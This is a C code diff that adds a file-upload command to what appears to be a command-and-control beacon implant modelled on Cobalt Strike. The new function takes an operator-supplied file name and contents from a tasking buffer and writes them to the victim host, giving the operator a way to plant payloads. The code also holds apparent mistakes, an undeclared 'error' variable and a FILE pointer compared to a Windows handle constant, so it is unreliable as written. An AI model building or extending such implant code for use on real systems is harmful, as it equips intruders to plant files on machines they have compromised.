@@ -100,3 +100,33 @@ void DownloadDo(char* buffer, int length)
 	cleanup:
 	BeaconDataFree(locals);
 }
+
+void Upload(char* buffer, int length, char* mode)
+{
+	char* lpFileName = malloc(0x400);
+	if(lpFileName == NULL)
+		return;
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int filenameSize = BeaconDataStringCopySafe(&parser, lpFileName, 0x400);
+	if (filenameSize == 0)
+		goto cleanup;
+
+	FILE* file = fopen(lpFileName, mode);
+	if (file == INVALID_HANDLE_VALUE || file == NULL)
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not upload file: %s", LAST_ERROR_STR(error));
+		BeaconErrorD(ERROR_UPLOAD_OPEN_FAILED, lastError);
+		goto cleanup;
+	}
+
+	int remaining = BeaconDataLength(&parser);
+	char* data = BeaconDataBuffer(&parser);
+	fwrite(data, sizeof(char), remaining, file);
+	fclose(file);
+
+	cleanup:
+	free(lpFileName);
+}
